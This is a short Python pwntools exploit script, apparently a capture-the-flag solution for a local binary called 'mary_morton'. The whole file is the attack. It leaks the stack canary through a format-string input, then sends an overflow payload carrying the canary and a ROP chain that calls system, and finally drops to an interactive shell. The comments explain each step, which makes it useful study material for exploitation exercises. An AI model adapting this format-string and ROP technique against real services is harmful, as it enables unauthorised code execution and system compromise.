#First import pwntools
from pwn import *

#Establish the target process
target = process('./mary_morton')
#gdb.attach(target, gdbscript='b *0x4009a5')

raw_input()

#Establish the address for the ROP chain
gadget0 = 0x400ab3
cat_adr = 0x400b2b
sys_adr = 0x4006a0

#Recieve and print out the opening text
print(target.recvuntil("Exit the battle"))

#Execute the format string exploit to leak the stack canary
target.sendline("2")
target.sendline("%23$llx")
target.recvline()
canary = target.recvline()
canary = int(canary, 16)
print("canary: " + hex(canary))
print(target.recvuntil("Exit the battle"))

#Put the Rop chain together, and send it to the server to exploit it
target.sendline(b"1")
payload = b"0"*136 + p64(canary) + b"1"*8 + p64(gadget0) + p64(cat_adr) + p64(sys_adr)
target.send(payload)

#Drop to an interactive shell
target.interactive()
